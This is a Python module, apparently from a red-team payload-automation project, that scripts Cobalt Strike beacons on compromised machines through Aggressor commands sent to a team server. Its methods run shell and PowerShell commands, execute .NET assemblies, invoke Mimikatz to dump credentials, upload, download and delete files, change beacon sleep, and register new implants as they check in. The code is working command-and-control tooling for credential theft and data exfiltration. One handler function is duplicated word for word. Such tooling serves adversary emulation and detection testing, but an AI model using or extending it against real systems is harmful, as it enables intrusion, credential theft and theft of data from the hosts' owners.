
from payload_automation.striker import CSConnector
import re
from uuid import uuid4
from datetime import datetime
import os

# Imports for testing
from time import sleep
import sys

class Beacon:
    def __init__(self, id, teamserver, user, password, cobaltstrike_directory):
        self.id = id
        self.tasks = []
        self.teamserver = teamserver
        self.user = user
        self.password = password
        self.csdir = cobaltstrike_directory
        self.metadata = self.getMetadata()

    def getMetadata(self):

        metadata = {}

        username = f"{self.user}_{self.id}_metadata"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            metadata = cs.ag_get_object(f"return binfo({self.id})")

        metadata["user"] = metadata["user"].replace(" *", "")
        return metadata



    def checkSuccess(self, output, success_criteria, failure_criteria):
        success = None
        if failure_criteria:
            for criteria in failure_criteria:
                regex = re.compile(criteria, re.MULTILINE|re.DOTALL)
                if re.match(regex, output) :
                    success = False

        # Success criteria overrides any failure criterias
        if success_criteria:
            for criteria in success_criteria:
                #print(f"Checking for regex: {criteria}")
                regex = re.compile(criteria, re.MULTILINE|re.DOTALL)
                if re.match(regex, output) :
                    success =  True

        if success is None and not success_criteria:
            # We didn't have any successes or failures and there were no success criteria defined, so assume success
            success = True
        elif success is None and success_criteria:
            # We had no hits in success or failure, but success criteria was provided, so we default to false
            success =  False

        return success


    # Type options are:
    #   input (what you would type into a beacon)
    #   sleep (what you would type into a script console)
    def task(self, cmd, type="input", output=True):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_tasker"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(f"bshell({self.id}, '{cmd}')")
            #print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2);}}}}"
                #print(output_catcher)
                #print(cs.ag_get_string(output_catcher))
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                cs.cs_process.expect(r'received output:.*')
                print(cs.cs_process.after.decode())



     # Wrote this one first, probably won't use it, but might come in handy at some point, so keeping it
    def wait_for_job(self, job_id=None, sleep_time=10):
        job_complete = False
        agcode = f"bjobs({self.id})"
        
        username = f"{self.user}_{self.id}_job_watcher"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            job_catcher = f"on beacon_output_jobs{{if($1 eq '{self.id}'){{ println(\"$1 Results: $2\");}}}}"
            cs.ag_sendline(job_catcher)

            while not job_complete:
                # Get jobs
                cs.cs_process.expect(f'{self.id} Results:.*')
                job_data_rex = re.compile(f'{self.id} Results: (.*)', re.DOTALL|re.MULTILINE)
                job_data = re.findall(job_data_rex, cs.cs_process.after.decode())[0]

                if job_data == '\r\n':
                    job_complete = True
                else:
                    print(job_data)
                    sleep(sleep_time)
                    cs.ag_sendline(f"bclear({self.id})")
                    cs.ag_sendline(agcode)

    def check_job_status(self, job_id=None):
        job_complete = False
        agcode = f"bjobs({self.id})"
        
        username = f"{self.user}_{self.id}_job_checker"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            #cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            job_catcher = f"on beacon_output_jobs{{if($1 eq '{self.id}'){{ println(\"$1 Results: $2\");}}}}"
            cs.ag_sendline(job_catcher)

            cs.cs_process.expect(f'{self.id} Results:.*')
            job_data_rex = re.compile(f'{self.id} Results: (.*)', re.DOTALL|re.MULTILINE)
            job_data = re.findall(job_data_rex, cs.cs_process.after.decode())[0]
                
            if job_data == '\r\n':
                print("Done monitoring jobs")
                return True
            else:
                return False
    
    ################## END HELPER FUNCTIONS ####################


    ################## START BEACON FUNCTIONS ##################
    

    def bexecute_assembly(self, assembly, assembly_args, output=True, wait_for_job=False, expect_end=None, success_criteria=None, failure_criteria=None, pexpect_timeout=180):
        agcode = f"bexecute_assembly({self.id}, '{assembly}', '{assembly_args}')"
        result = Task(agcode)
        result.output = ""

        username = f"{self.user}_{self.id}_bexecute_assembly"
        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)

            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2); println(\"----END $1 OUTPUT----\")}}}}"
                cs.ag_sendline(output_catcher)

                if wait_for_job:
                    # We are not checking the expect_end, we are regularly checking to see if the job is complete, then stopping when the job is done

                    # Grab data once, then check if job is done. If not, keep grabbing data
                    
                    output_rex = re.compile(f"received output:\r\n(.*)", re.DOTALL|re.MULTILINE)
                    cs.cs_process.expect(f"----END {self.id} OUTPUT----", timeout=pexpect_timeout)

                    output_data = cs.cs_process.before.decode()
                    try:
                        result.output = result.output + re.findall(output_rex, output_data)[0]
                    except IndexError:
                        print("Didn't get a match on this one:")
                        print(cs.cs_process.before.decode())
                        sys.exit(1)

                    while not self.check_job_status():
                        cs.cs_process.expect(f"----END {self.id} OUTPUT----", timeout=pexpect_timeout)
                        output_data = cs.cs_process.before.decode()
                        try:
                            result.output = result.output + re.findall(output_rex, output_data)[0]
                        except IndexError:
                            print("Didn't get a match on this one:")
                            print(cs.cs_process.before.decode())
                            sys.exit(1)
                else:
                    # We aren't waiting for the job to end, we are parsing until we hit one of our expected ends
                    if expect_end:
                        #print("In the both sitch")
                        cs.cs_process.expect(expect_end, timeout=pexpect_timeout)
                        output_rex = re.compile('received output:\r\n(.*)', re.DOTALL|re.MULTILINE)
                        result.output = result.output + re.findall(output_rex, (cs.cs_process.before.decode() + cs.cs_process.after.decode()))[0]
                    else:
                        #print("In the after sitch")
                        cs.cs_process.expect(r'received output:.*', timeout=pexpect_timeout)
                        output_data = cs.cs_process.after.decode()
                        #print(output_data)
                        result.output = result.output + output_data


        result.completed = datetime.now()       

        result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

        self.tasks.append(result)
        return result

    def bmkdir(self, path, output=True, expect_end=None, success_criteria=None, failure_criteria=None, pexpect_timeout=90):
        # bmkdir provides no feedback or output on success or error
        # Eventually I'll add the option to call bls() after and report success or failure based on that

        # We need to escape the backslashes in the paths
        path = path.replace('\\', '\\\\')
        agcode = f"bmkdir({self.id}, '{path}')"
        #print(agcode)
        #print(path)
        result = Task(agcode)

        username = f"{self.user}_{self.id}_bmkdir"

        checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println(\"---- CHECKIN FROM $1 ----\");}}}}"
        
        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            cs.ag_sendline(checkin_catcher)
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            cs.cs_process.expect(f"---- CHECKIN FROM {self.id} ----", timeout=pexpect_timeout)

        return result

    def bpowershell(self, cmd, output=True, asynchronous=False, expect_end=None, success_criteria = None, failure_criteria = ['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):

        agcode = f"bpowershell({self.id}, '{cmd}')"
        result = Task(agcode)

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bpowershell"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            #print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2);}}}}"
                #print(output_catcher)
                #print(cs.ag_get_string(output_catcher))
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                if expect_end:
                    #print("In the both sitch")
                    cs.cs_process.expect(expect_end)
                    output_rex = re.compile('received output:\r\n(.*)', re.DOTALL|re.MULTILINE)
                    result.output = re.findall(output_rex, (cs.cs_process.before.decode() + cs.cs_process.after.decode()))[0]
                else:
                    #print("In the after sitch")
                    cs.cs_process.expect(r'received output:.*')
                    result.output = cs.cs_process.after.decode()
                result.completed = datetime.now()
                

                result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

                self.tasks.append(result)
                return result
            elif not output and not asynchronous:
                # This is a situation where we don't want output, but we do want to make sure the command was picked up, so we want a beacon_checkin rather than beacon_output
                checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
                cs.ag_sendline(checkin_catcher)
                cs.cs_process.expect(r'host called home, sent:.*', timeout=None)
                result.completed = datetime.now()
                result.success = None
                self.tasks.append(result)
                return result


    # Failure example 1:
    #received output:
    #'somethingsomethingdarkside' is not recognized as an internal or external command,
    #operable program or batch file.

    # Failure example 2:
    #received output:
    #& was unexpected at this time.
    def bshell(self, cmd, output=True, asynchronous=False, success_criteria = None, failure_criteria = ['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):

        agcode = f"bshell({self.id}, '{cmd}')"
        result = Task(agcode)

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bshell"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            #print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2);}}}}"
                #print(output_catcher)
                #print(cs.ag_get_string(output_catcher))
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                cs.cs_process.expect(r'received output:.*', timeout=None)
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()

                result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

                self.tasks.append(result)
                return result
            elif not output and not asynchronous:
                # This is a situation where we don't want output, but we do want to make sure the command was picked up, so we want a beacon_checkin rather than beacon_output
                checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
                cs.ag_sendline(checkin_catcher)
                cs.cs_process.expect(r'host called home, sent:.*', timeout=None)
                result.completed = datetime.now()
                result.success = None
                self.tasks.append(result)
                return result

    def bupload(self, file, remote_path=None, bytes=None):
        if remote_path:
            #print(r)
            # We are passing it to Sleep, so we need to escape the '\' character
            remote_path = remote_path.replace("\\", "\\\\")

            #  $handle = openf(script_resource("hello. $+ $barch $+ .o"));
            #  $data   = readb($handle, -1);
            #  closef($handle);
            agcode = f"$handle = openf('{file}'); $data = readb($handle, -1); closef($handle); bupload_raw({self.id}, '{remote_path}', $data)"
            #print(agcode)
        else:
            agcode = f"bupload({self.id}, '{file}')"
        result = Task(agcode)

        file_size = os.path.getsize(file)


        checkin_rex = re.compile("host called home, sent: ([0-9]*) bytes")
        checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
        checkin_bytes = 0
        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bupload"

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            cs.ag_sendline(checkin_catcher)
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            

            cs.cs_process.expect(r"host called home, sent: ([0-9]*) bytes", timeout=None)
            last_bytes = re.findall("host called home, sent: ([0-9]*) bytes", cs.cs_process.match.group(0).decode())[0]
            checkin_bytes += int(last_bytes)

            while checkin_bytes < file_size:
                cs.cs_process.expect(r"host called home, sent: ([0-9]*) bytes", timeout=None)
                last_bytes = re.findall("host called home, sent: ([0-9]*) bytes", cs.cs_process.match.group(0).decode())[0]
                checkin_bytes += int(last_bytes)

        return result


    def bmimikatz(self, command, pid=None, arch=None, output=True, expect_end=None, success_criteria=None, failure_criteria=None, pexpect_timeout=90):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bmimikatz"

        if not arch and not pid:
            agcode = f"bmimikatz({self.id}, '{command}');"
        elif arch and pid:
            agcode = f"bmimikatz({self.id}, '{command}', '{pid}', '{arch}');"

        result = Task(agcode)
        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            #print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2);}}}}"
                #print(output_catcher)
                #print(cs.ag_get_string(output_catcher))
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                cs.cs_process.expect(r'received output:.*', timeout=None)
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()

                result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

                self.tasks.append(result)
                return result

    def bexit(self, output=True, success_criteria=None, failure_criteria=None, pexpect_timeout=90):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bexit"
        agcode = f"bexit({self.id});"

        result = Task(agcode)
        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            cs.ag_sendline(agcode)
            #print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output{{if($1 eq '{self.id}'){{ println($2);}}}}"
                #print(output_catcher)
                #print(cs.ag_get_string(output_catcher))
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                cs.cs_process.expect(r'received output:.*', timeout=None)
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()

                result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

                self.tasks.append(result)
                return result


    def bls(self, path, output=True, asynchronous=False, success_criteria = None, failure_criteria = None, timeout=None):


        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bls"
        escaped_path = path.replace("\\", "\\\\")

        # bls and bps are a bit different because they actually accept callback functions, so what we want to do is build a sleep callback function and send that to catch the output
        agcode = f"sub catcher{{println($3);}}; bls({self.id}, '{escaped_path}', &catcher);"

        result = Task(agcode)
        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            #print(agcode)
            cs.ag_sendline(agcode)

            if output:
                # Different than most since our agcode already has a catcher built in due to the callback. Code gets a little cleaner
                #print(f'{escaped_path}.*')
                cs.cs_process.expect(f'{escaped_path}.*', timeout=None)
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()
                #print(result.output)

                result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)

                self.tasks.append(result)
                return result

    def brm(self, path, output=False, asynchronous=False, success_criteria = None, failure_criteria = None):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bls"
        escaped_path = path.replace("\\", "\\\\")

        agcode = f"brm({self.id}, '{escaped_path}');"

        result = Task(agcode)

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:
            # clear beacon queue
            # setup on beacon output to catch 
            # send command as binput()
            cs.ag_sendline(f"bclear({self.id})")
            #print(agcode)
            cs.ag_sendline(agcode)

            # This is a situation where we don't get output, but we do want to make sure the command was picked up, so we want a beacon_checkin rather than beacon_output
            checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
            cs.ag_sendline(checkin_catcher)
            cs.cs_process.expect(r'host called home, sent:.*', timeout=None)
            result.completed = datetime.now()
            result.success = None
            self.tasks.append(result)
        
        return result

    def bsleep(self, sleep, jitter=None, output=False, asynchronous=False, success_criteria = None, failure_criteria = None):
        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bsleep"

        if jitter:
            agcode = f"bsleep({self.id}, {sleep}, {jitter});"
        else:
            agcode = f"bsleep({self.id}, {sleep}, 0);"

        result = Task(agcode)

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:

            cs.ag_sendline(f"bclear({self.id})")
            #print(agcode)
            cs.ag_sendline(agcode)

            # This is a situation where we don't get output, but we do want to make sure the command was picked up, so we want a beacon_checkin rather than beacon_output
            checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
            cs.ag_sendline(checkin_catcher)
            cs.cs_process.expect(r'host called home, sent:.*', timeout=None)
            result.completed = datetime.now()
            result.success = True
            self.tasks.append(result)

        return result


    def bdownload(self, remote_path, output=False, asynchronous=False, success_criteria = None, failure_criteria = None):
        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bdownload"

        remote_path = remote_path.replace("\\", "\\\\")

        agcode = f"bdownload({self.id}, '{remote_path}');"

        #print(agcode)

        result = Task(agcode)

        with CSConnector(
	    cs_host=self.teamserver, 
	    cs_user=username,
        cs_pass=self.password, 
	    cs_directory=self.csdir) as cs:

            cs.ag_sendline(f"bclear({self.id})")
            #print(agcode)
            cs.ag_sendline(agcode)

            # This is a situation where we don't get output, but we do get a message when it's complete. For now, I'm lazy coding to just do .* for file name, 
            # but you could make that more precise if it causes errors in the future
            checkin_catcher = f"on beacon_output_alt{{if($1 eq '{self.id}'){{ println($2);}}}}"
            cs.ag_sendline(checkin_catcher)
            cs.cs_process.expect(r'download of .* is complete.*', timeout=None)
            result.completed = datetime.now()
            result.success = True
            self.tasks.append(result)

        return result
    
class Task:
    # input - the raw aggressor command
    # output - the output text
    # success - boolean of if the task completed as expected or errored
    def __init__(self, input, attack_ids=[], procedure_id=None):
        # We create a unique ID for the task
        self.id = uuid4()
        self.input = input
        self.output = None
        self.success = None
        self.completed = None
        self.attack_ids = attack_ids
        self.procedure_id = procedure_id

# Not really used as I merged this into the Beacon class with Beacon.getMetadata()
def cs_getBeaconInfo(teamserver, user, password, cobaltstrike_directory, bid):

    username = f"{user}_beacon_query"
    with CSConnector(
	    cs_host=teamserver, 
	    cs_user=username,
        cs_pass = password, 
	    cs_directory=cobaltstrike_directory) as cs:
        
        query = f"return binfo({bid})"
        #print(query)
        beacon = cs.ag_get_object(query)
        #print(beacon)
    
    return beacon

def incoming_beacon_handler(teamserver, user, password, cobaltstrike_directory, kill_flag, beacons):
    username = f"{user}_beacon_handler"
    with CSConnector(
	    cs_host=teamserver, 
	    cs_user=username,
        cs_pass=password, 
	    cs_directory=cobaltstrike_directory) as cs:

        sleep_beacon_catcher = "e on beacon_initial {println($1);}"
        cs.cs_process.setecho(False)
        cs.cs_process.sendline(sleep_beacon_catcher)

        before = None
        expect = r'\r\n'
        while True:
            #print("In while loop")
            if kill_flag():
                #print("Kill flag reached")
                break

            cs.cs_process.expect(expect, timeout=None)
            before = cs.cs_process.before.decode()
            if before:
                # BIDs are 9 digits in testing, though older versions of CS used shorter BIDs. Just doing a range to be safer.
                #print(before)
                bid = re.search(r'([0-9]{5,15})', before)[0]
                print(f"New beacon with BID: {bid}")
                beacons.append(cs_getBeaconInfo(teamserver, user, password, cobaltstrike_directory, bid)) 
            #expect = r'[0-9]{5,10}'
            before = None
        #print("After while loop")


def incoming_beacon_handler(teamserver, user, password, cobaltstrike_directory, kill_flag, beacons):
    username = f"{user}_beacon_handler"
    with CSConnector(
	    cs_host=teamserver, 
	    cs_user=username,
        cs_pass=password, 
	    cs_directory=cobaltstrike_directory) as cs:

        sleep_beacon_catcher = "e on beacon_initial {println($1);}"
        cs.cs_process.setecho(False)
        cs.cs_process.sendline(sleep_beacon_catcher)

        before = None
        expect = r'\r\n'
        while True:
            #print("In while loop")
            if kill_flag():
                #print("Kill flag reached")
                break

            cs.cs_process.expect(expect, timeout=None)
            before = cs.cs_process.before.decode()
            if before:
                # BIDs are 9 digits in testing, though older versions of CS used shorter BIDs. Just doing a range to be safer.
                #print(before)
                bid = re.search(r'([0-9]{5,15})', before)[0]
                print(f"New beacon with BID: {bid}")
                beacons.append(cs_getBeaconInfo(teamserver, user, password, cobaltstrike_directory, bid)) 
            #expect = r'[0-9]{5,10}'
            before = None
        #print("After while loop")


def getNextBeacon(teamserver, user, password, cobaltstrike_directory):
    username = f"{user}_beacon_handler"
    with CSConnector(
	    cs_host=teamserver, 
	    cs_user=username,
        cs_pass=password, 
	    cs_directory=cobaltstrike_directory) as cs:

        sleep_beacon_catcher = "e on beacon_initial {println($1);}"
        cs.cs_process.setecho(False)
        cs.cs_process.sendline(sleep_beacon_catcher)

        cs.cs_process.expect(r'\r\n', timeout=None)
        before = cs.cs_process.before.decode()
        bid = re.search(r'([0-9]{5,15})', before)[0]

        
    return Beacon(bid, teamserver, user, password, cobaltstrike_directory)